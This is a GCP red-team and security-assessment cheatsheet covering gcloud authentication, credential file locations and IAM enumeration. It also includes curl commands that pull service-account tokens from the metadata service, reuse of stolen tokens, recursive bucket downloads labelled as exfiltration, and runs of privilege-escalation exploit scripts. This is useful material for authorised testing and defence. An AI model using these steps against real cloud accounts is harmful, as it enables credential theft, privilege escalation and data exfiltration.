---
title: GCP
description: GCP Red Teaming & Security Assessment Cheatsheet
icon: material/google-cloud # simple/portainer , octicons/mark-github-16 , material/account-convert , lucide/atom
# status: new # deprecated
comments: true
# hide:
#     - navigation
#     - toc
#     - feedback
#     - tags
---

# GCP Red Teaming & Security Assessment Cheatsheet

## Google Cloud Ecosystem Overview

**Three Main Components of Google Cloud:**

!!! tip

    Understanding these components helps identify attack surfaces across different Google services.

- **Cloud Identity** - Identity and Access Management (IDaaS)
- **Google Workspace** (G-suite) - Productivity & Collaboration Suite
- **Google Cloud Platform (GCP)** - _IaaS, PaaS, SaaS_ Cloud Services

### Cloud Identity Deep Dive

- **Identity Provider (IdP)**
    - Cloud Identity is an Identity as a Service (IDaaS) solution
    - Centrally manages users and groups across Google ecosystem
    -  Supports federation with external IdPs (Active Directory, Azure AD, etc.)
    - **API Endpoint**: `https://cloudidentity.googleapis.com`
    - **Key Role**: Organization Admin (gcloud role)

### Google Cloud Platform Fundamentals

- **Regions & Zones**
    - **Regions**: Independent geographic areas composed of multiple zones
    - **Zones**: Isolated locations within regions (data centers)
    - **Current Count**: ~24 regions globally (check GCP documentation for updates)
    - **Red Team Note**: Resource location can impact legal/regulatory scope

- **Service Accounts**
    - Special Google accounts representing non-human entities
    - Used for authentication/authorization to Google APIs
    - **Two Main Types**:
    - **User-managed service accounts**: Created and managed by users
    - **Default service accounts**: Automatically created by GCP services
    - **Security Consideration**: Often over-privileged in misconfigured environments


## GCP Authentication Methods
### Authentication Credential Types

#### Long-Term Credentials

##### Graphical User Interface (GUI)
- Gmail / G-Suite / Cloud Identity Username & Password
- SSO Username & Password (federated identity)
##### Programmatic Interface (CLI/SDK)
- Username & Password (less common for services)
- Service Account JSON Key Files (primary service authentication)
- API Keys (for specific services)

#### Short-Term Credentials
##### Programmatic Interface (CLI/SDK/API)
- OAuth 2.0 Access Tokens (typically 1-hour validity)
- Identity Tokens (for service-to-service authentication)

### gcloud CLI Authentication Operations
**Interactive User Login:**

```bash
gcloud auth login
# Opens browser for OAuth flow
# Stores credentials in local config

gcloud auth login --no-launch-browser
# Use for CLI-only authentication
```

**Service Account Authentication:**

```bash
gcloud auth activate-service-account --key-file service-account-key.json
# Authenticates using service account credentials
# Essential for automated scripts and service authentication
```

**Credential Management:**

```bash
# List authenticated accounts
gcloud auth list

# Set active account (when multiple are authenticated)
gcloud config set account [EMAIL_OR_SERVICE_ACCOUNT]

# Revoke credentials
gcloud auth revoke [ACCOUNT]
```

### Credential Storage & Security
These locations are valuable targets for credential harvesting

**gcloud CLI Credential Storage Locations:**

=== "Windows"

    ```powershell
    C:\Users\[UserName]\AppData\Roaming\gcloud\
    ```

=== "Linux/macOS"

    ```bash
    ~/.config/gcloud/
    ```


#### Key files and databases
- `access_tokens.db` - Contains OAuth tokens
- `credentials.db` - Contains service account keys
- `legacy_credentials` - Old format credentials
- `application_default_credentials.json` - ADC credentials


**Credential Database Analysis:**

```sql
-- access_tokens.db structure
Table: access_tokens
Columns: account_id, access_token, token_expiry, rapt_token

-- credentials.db structure  
Table: credentials
Columns: account_id, value
```

**Tools for Credential Extraction:**

- **gcloud itself**: Use `gcloud auth print-access-token`
- **SQLite**: Direct database querying
- **Custom scripts**: Parse credential files programmatically

## Google Cloud Core Services Enumeration
### Initial Reconnaissance

```bash
# Current authentication context
gcloud auth list
gcloud config list
gcloud info  # Detailed configuration information
```

### Organization Enumeration

!!! tip

    Organization-level access provides visibility across all projects

```bash
# List accessible organizations
gcloud organizations list

# Get organization details
gcloud organizations describe [ORGANIZATION_ID]

# Enumerate IAM policies at organization level
gcloud organizations get-iam-policy [ORGANIZATION_ID]

# Format for easier reading
gcloud organizations get-iam-policy [ORG_ID] --format=json
```

### Project Enumeration

```bash
# List all accessible projects
gcloud projects list
gcloud projects list --format="table(projectId,name,projectNumber)"

# Get detailed project information
gcloud projects describe [PROJECT_ID]

# Enumerate project IAM policies
gcloud projects get-iam-policy [PROJECT_ID]
gcloud projects get-iam-policy [PROJECT_ID] --format=json
```

### Service Account Enumeration

```bash
# List service accounts in project
gcloud iam service-accounts list
gcloud iam service-accounts list --format="table(email,displayName)"

# Get IAM policy for specific service account
gcloud iam service-accounts get-iam-policy [SERVICE_ACCOUNT_EMAIL]

# List keys for service account (requires iam.serviceAccountKeys.list permission)
gcloud iam service-accounts keys list --iam-account=[SERVICE_ACCOUNT_EMAIL]

# Describe service account key (metadata only)
gcloud iam service-accounts keys describe [KEY_ID] --iam-account=[SERVICE_ACCOUNT_EMAIL]
```

### Role & Permission Enumeration

**Pre-defined Roles:**

```bash
# List available roles
gcloud iam roles list
gcloud iam roles list --filter="title:Owner"  # Filter specific roles

# Get role details and permissions
gcloud iam roles describe roles/owner
gcloud iam roles describe roles/editor
```

**Custom Roles:**

```bash
# List custom roles in project/organization
gcloud iam roles list --project=[PROJECT_ID]
gcloud iam roles list --organization=[ORG_ID]

# Describe custom role
gcloud iam roles describe [ROLE_NAME] --project=[PROJECT_ID]
```

### Advanced Enumeration Commands

```bash
# Check specific member permissions in project
gcloud projects get-iam-policy [PROJECT_ID] \
  --flatten="bindings[].members" \
  --filter="bindings.members=serviceaccount:[SERVICE_ACCOUNT_EMAIL]" \
  --format="value(bindings.role)"

# Export IAM policy to file for analysis
gcloud projects get-iam-policy [PROJECT_ID] --format=json > iam_policy.json
```

## Red Team Operations in Google Cloud
### Initial Compromise & Enumeration

**Service Account Authentication:**

```bash
gcloud auth activate-service-account --key-file compromised-sa-key.json
```

**Basic Environment Recon:**

```bash
# Project enumeration
gcloud projects list
gcloud projects get-iam-policy [PROJECT_ID]

# Check current identity permissions
gcloud auth list
gcloud config list
```

**Targeted IAM Policy Query:**

```bash
gcloud projects get-iam-policy [PROJECT_ID] \
  --flatten="bindings[].members" \
  --filter="bindings.members=serviceaccount:[TARGET_SERVICE_ACCOUNT]" \
  --format="value(bindings.role)"
```

### Compute Instance Exploitation
**List Compute Resources:**

```bash
gcloud compute instances list
gcloud compute instances describe [INSTANCE_NAME] --zone=[ZONE]
```

**Metadata Service Exploitation:**


!!! danger "Note"
    Cloud Metadata API is a prime target via SSRF/RCE vulnerabilities


```bash
# Retrieve access token from metadata service
curl -H "Metadata-Flavor: Google" \
  "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token"

# Get service account email
curl -H "Metadata-Flavor: Google" \
  "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email"

# Get all metadata (information disclosure)
curl -H "Metadata-Flavor: Google" \
  "http://169.254.169.254/computeMetadata/v1/instance/?recursive=true"
```

**Using Stolen Access Tokens:**

```bash
# Save token to file
echo "ya29.[TOKEN]" > token.txt

# Use token for API calls
gcloud projects list --access-token-file token.txt

# Alternative token usage
export CLOUDSDK_AUTH_ACCESS_TOKEN=$(cat token.txt)
gcloud projects list
```

### Storage Bucket Enumeration & Exfiltration

```bash
# List storage buckets
gcloud storage ls --access-token-file token.txt

# List contents of specific bucket
gcloud storage ls gs://[BUCKET_NAME] --access-token-file token.txt

# Download files from bucket
gcloud storage cp gs://[BUCKET_NAME]/[FILE_PATH] . --access-token-file token.txt

# Recursive download
gcloud storage cp gs://[BUCKET_NAME]/* . --recursive --access-token-file token.txt
```

### Privilege Escalation Pathways

**Service Account Chain Switching:**

```bash
# Authenticate with new service account
gcloud auth activate-service-account --key-file new-sa-key.json

# Check new permissions
gcloud projects get-iam-policy [PROJECT_ID] \
  --flatten="bindings[].members" \
  --filter="bindings.members=serviceaccount:[NEW_SERVICE_ACCOUNT]" \
  --format="value(bindings.role)"
```

### Automated Enumeration Tools

**GCP Enumeration Script:**

```bash
# Download and execute
git clone https://gitlab.com/gitlab-com/gl-security/threatmanagement/redteam/redteam-public/gcp_enum.git
cd gcp_enum
chmod +x gcp_enum.sh
./gcp_enum.sh
```

**Privilege Escalation Scanners:**

```bash
# Privesc Scanner
python3 enumerate_member_permissions.py -p [PROJECT_ID]
python3 check_for_privesc.py

# Rhino Security Labs GCP-IAM-Privilege-Escalation
git clone https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation.git
cd GCP-IAM-Privilege-Escalation
python3 ExploitScripts/iam.roles.update.py
```

### Additional Red Team Tools

**Comprehensive GCP Security Tools:**

- **GCPGoat**: intentionally vulnerable GCP environment
- **ScoutSuite**: multi-cloud security auditing tool
- **Forseti Security**: GCP security monitoring
- **Terrascan**: infrastructure as code security scanner

### Common Misconfigurations

- Over-privileged service accounts
- Public storage buckets
- Weak IAM policies
- Exposed metadata services

### Critical Permissions to Hunt

- `iam.serviceAccounts.getAccessToken`
- `iam.roles.update`
- `resourcemanager.projects.setIamPolicy`
- `storage.buckets.get`